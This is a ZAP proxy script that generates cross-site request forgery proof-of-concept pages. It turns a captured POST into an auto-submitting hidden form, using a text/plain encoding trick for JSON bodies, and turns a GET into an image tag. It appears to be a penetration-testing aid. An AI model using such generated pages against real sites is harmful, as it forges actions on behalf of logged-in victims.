//csrf poc generater supporting json csrf
//it will copy the results to clipboard and print them to the zap script console
// released under the Apache v2.0 licence.
//You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0

function invokeWith(msg) {
	string = "<!DOCTYPE html>\n";
	string += "<head>\n <title>CSRF POC</title>\n</head>";
	string += "\n<body>";
	if(msg.getRequestHeader().getMethod().toString()== "POST"){
	body = msg.getRequestBody().toString();
	body = body.trim();
	if(isJson(body))
		string += "\n<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\" enctype=\"text/plain\">" ;
	else
		string += "\n<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\">";
	if(!isJson(body)){	
	body=body.split('&');
	for(i=0;i<body.length;i++)
	{
		keyval = body[i].split('=')
		string += "\n<input type=\"hidden\" name=\""+decodeURIComponent(keyval[0])+"\" value=\""+decodeURIComponent(keyval[1])+"\" />";	
	}
	}
	else{
		string += "\n<input type ='hidden' name='"+body.substring(0,body.length()-1)+",\"ignore_me\":\"' value='something\"}'>"
	}
	string += "\n</form>";
	string += "\n<script>document.getElementById('formid').submit();</script>";
	}
	else if(msg.getRequestHeader().getMethod().toString() == "GET"){
	string += "\n<img src=\""+msg.getRequestHeader().getURI().toString()+"\">";
	}
	string += "\n</body></html>";
	print("\n\n\n");
	print(string);
	selected = new java.awt.datatransfer.StringSelection(string);
	clipboard = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
	clipboard.setContents(selected,null);
	
}

function isJson(str)
{
	try{
		JSON.parse(str);
	}
	catch(e){
		return false;
	}
		return true;
}
